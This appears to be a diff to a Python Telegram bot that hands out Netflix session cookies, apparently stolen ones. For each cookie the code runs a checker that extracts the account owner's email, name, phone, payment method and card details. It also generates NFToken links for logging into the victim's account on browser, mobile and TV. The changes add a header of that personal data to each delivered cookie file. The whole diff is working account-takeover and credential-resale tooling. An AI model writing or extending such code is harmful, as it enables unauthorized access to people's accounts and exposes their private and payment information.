@@ -785,19 +785,7 @@ def handle_callback(call):
                 delivery_markup
             )
 
-            # Step 3: Send the actual cookie file
-            file_bytes = io.BytesIO(cookie_content.encode())
-            file_bytes.name = filename
-            bot.send_document(chat_id, file_bytes,
-                caption=(
-                    f"🎬 <b>Netflix {plan_label} Cookie</b>\n\n"
-                    f"📁 <b>ID:</b> <code>{public_id}</code>\n"
-                    f"🌍 <b>Country:</b> <code>{country_db}</code>"
-                ),
-                parse_mode="HTML"
-            )
-
-            # Step 4: NFToken generation steps (animated)
+            # Step 3: NFToken generation steps (animated) — run checker first
             nftoken_msg = bot.send_message(chat_id,
                 f"🔍 <b>Generating NFToken:</b> <code>[Parsing Cookie]</code> ⏳",
                 parse_mode="HTML"
@@ -813,62 +801,111 @@ def handle_callback(call):
                 text=f"🔗 <b>Generating NFToken:</b> <code>[Building Watch Links]</code> ⏳", parse_mode="HTML")
             time.sleep(1.5)
 
-            # Step 5: Parse cookies and run real checker
-            cookie_dict = parse_cookie_dict(cookie_content)
+            # Step 4: Parse cookies and run real checker
+            cookie_dict  = parse_cookie_dict(cookie_content)
             account_info = check_netflix_account(cookie_dict)
+            now_str      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-            # Pull real fields (with N/A fallbacks)
+            # Pull real fields using exact keys from checker.py extract_info()
             if account_info:
-                email        = account_info.get("email")        or "N/A"
-                name_acc     = account_info.get("accountOwnerName") or "N/A"
-                country_real = account_info.get("countryOfSignup") or country_db
-                plan_real    = account_info.get("localizedPlanName") or f"Netflix {plan_label}"
-                streams      = str(account_info.get("maxStreams") or "N/A").rstrip("}")
-                quality      = account_info.get("videoQuality")  or "N/A"
-                next_bill    = account_info.get("nextBillingDate") or "N/A"
-                payment      = account_info.get("paymentMethodType") or "N/A"
-                member_since = account_info.get("memberSince")   or "N/A"
-                profiles     = account_info.get("profilesDisplay") or "N/A"
-                masked_card  = account_info.get("maskedCard")    or "N/A"
-                extra_member = account_info.get("showExtraMemberSection") or "N/A"
-                plan_price   = account_info.get("planPrice")     or "N/A"
+                email          = account_info.get("email")             or "N/A"
+                name_acc       = account_info.get("accountOwnerName")  or "N/A"
+                country_real   = account_info.get("countryOfSignup")   or country_db
+                plan_real      = account_info.get("localizedPlanName") or f"Netflix {plan_label}"
+                streams_raw    = account_info.get("maxStreams")        or "N/A"
+                streams        = str(streams_raw).rstrip("}") if streams_raw != "N/A" else "N/A"
+                quality        = account_info.get("videoQuality")      or "N/A"
+                next_bill      = account_info.get("nextBillingDate")   or "N/A"
+                payment        = account_info.get("paymentMethodType") or "N/A"
+                member_since   = account_info.get("memberSince")       or "N/A"
+                profiles       = account_info.get("profilesDisplay")   or "N/A"   # correct key
+                masked_card    = account_info.get("maskedCard")        or "N/A"
+                extra_member   = account_info.get("showExtraMemberSection") or "N/A"
+                plan_price     = account_info.get("planPrice")         or "N/A"
+                phone          = account_info.get("phoneDisplay")      or "N/A"   # correct key
+                email_verified = account_info.get("emailVerified")     or "N/A"   # already "Yes"/"No"
+                hold_status    = account_info.get("holdStatus")        or "N/A"
+                membership_status = account_info.get("membershipStatus") or "N/A"
+                profile_count  = account_info.get("profileCount")      or ""
+                user_guid      = account_info.get("userGuid")          or "N/A"
             else:
                 email = name_acc = country_real = quality = next_bill = "N/A"
                 payment = member_since = profiles = masked_card = extra_member = plan_price = "N/A"
-                streams  = "N/A"
+                phone = email_verified = hold_status = membership_status = user_guid = "N/A"
+                streams   = "N/A"
                 plan_real = f"Netflix {plan_label}"
+                profile_count = ""
 
-            # Step 6: Generate real NFToken
-            nf_token     = create_nftoken(cookie_dict)
-            watch_browser = f"https://netflix.com/?nftoken={nf_token}"      if nf_token else None
+            # Step 5: Generate real NFToken
+            nf_token      = create_nftoken(cookie_dict)
+            watch_browser = f"https://netflix.com/?nftoken={nf_token}"            if nf_token else None
             watch_mobile  = f"https://netflix.com/unsupported?nftoken={nf_token}" if nf_token else None
+            watch_tv      = f"https://netflix.com/t/smarttv?nftoken={nf_token}"   if nf_token else None
 
-            # Step 7: Build and send the full account details message
+            # Step 6: Build enriched cookie file with header block (image 2 style)
+            plan_display = f"{plan_real} [Streams: {streams}]" if streams != "N/A" else plan_real
+            # Format member_since nicely if it's a raw date string
+            member_since_display = member_since
+            try:
+                from checker import format_member_since as fmt_ms
+                member_since_display = fmt_ms(member_since) if member_since != "N/A" else "N/A"
+            except Exception:
+                pass
+
+            header_block = (
+                f"#{'=' * 50}\n"
+                f"#NETFLIX ACCOUNT DETAILS\n"
+                f"#SOFTWARE: CookiesSentinal - Advanced Cookies module\n"
+                f"#VERSION: V1.0.9\n"
+                f"#BUILD BY: @HYDRA_x001\n"
+                f"#{'=' * 50}\n"
+                f"#USERNAME         : {name_acc}\n"
+                f"#EMAIL            : {email}\n"
+                f"#PHONE            : {phone}\n"
+                f"#EMAIL VERIFIED   : {email_verified}\n"
+                f"#CREATED          : {member_since_display}\n"
+                f"#COUNTRY          : {country_real}\n"
+                f"#PLAN             : {plan_display}\n"
+                f"#PAYMENT METHOD   : {payment}\n"
+                f"#SOURCE           : Netflix\n"
+                f"#EXPIRE           : {next_bill}\n"
+                f"#DAYS LEFT        : N/A\n"
+                f"#PROFILE PIN      : N/A\n"
+                f"#LANGUAGE         : N/A\n"
+                f"#CHECKED AT       : {now_str}\n"
+                f"#{'=' * 50}\n\n"
+            )
+            enriched_cookie = header_block + cookie_content
+
+            file_bytes = io.BytesIO(enriched_cookie.encode())
+            file_bytes.name = filename
+            bot.send_document(chat_id, file_bytes,
+                caption=(
+                    f"🎬 <b>Netflix {plan_label} Cookie</b>\n\n"
+                    f"📁 <b>ID:</b> <code>{public_id}</code>\n"
+                    f"🌍 <b>Country:</b> <code>{country_db}</code>"
+                ),
+                parse_mode="HTML"
+            )
+
+            # Step 7: Account details message — image 3 style
+            profile_label = f"PROFILES ({profile_count})" if profile_count else "PROFILES"
             detail_text = (
                 f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"👤 <b>NAME:</b> <code>{name_acc}</code>\n"
                 f"📧 <b>EMAIL:</b> <code>{email}</code>\n"
                 f"🌍 <b>COUNTRY:</b> <code>{country_real}</code>\n"
-                f"📦 <b>PLAN:</b> <code>{plan_real}</code>\n"
-                f"💰 <b>PRICE:</b> <code>{plan_price}</code>\n"
-                f"🎞️ <b>QUALITY:</b> <code>{quality}</code>\n"
-                f"📺 <b>STREAMS:</b> <code>{streams}</code>\n"
-                f"👥 <b>EXTRA MEMBER:</b> <code>{extra_member}</code>\n"
-                f"📅 <b>MEMBER SINCE:</b> <code>{member_since}</code>\n"
-                f"🗓️ <b>NEXT BILLING:</b> <code>{next_bill}</code>\n"
-                f"💳 <b>PAYMENT:</b> <code>{payment}</code>\n"
-                f"💳 <b>CARD:</b> <code>{masked_card}</code>\n"
-                f"🎭 <b>PROFILES:</b> <code>{profiles}</code>\n"
-                f"🆔 <b>DATABASE ID:</b> <code>{public_id}</code>\n"
+                f"📅 <b>MEMBER SINCE:</b> <code>{member_since_display}</code>\n"
+                f"🎭 <b>{profile_label}:</b> <code>{profiles}</code>\n"
             )
 
             if nf_token:
                 detail_text += (
                     f"\n🔑 ✅ <b>NFTOKEN WATCH LINKS:</b>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                    f"🖥️ <a href='{watch_browser}'>Watch on PC</a>\n"
-                    f"📱 <a href='{watch_mobile}'>Watch on Mobile</a>\n"
+                    f"🔗 🔗 <a href='{watch_browser}'>Watch in Browser</a>\n"
+                    f"📱 📱 <a href='{watch_mobile}'>Watch on Mobile</a>\n"
+                    f"📺 📺 <a href='{watch_tv}'>Watch on TV</a>\n"
                 )
             else:
                 detail_text += f"\n⚠️ <b>NFTOKEN:</b> <code>Could not generate — cookie may need re-check</code>"
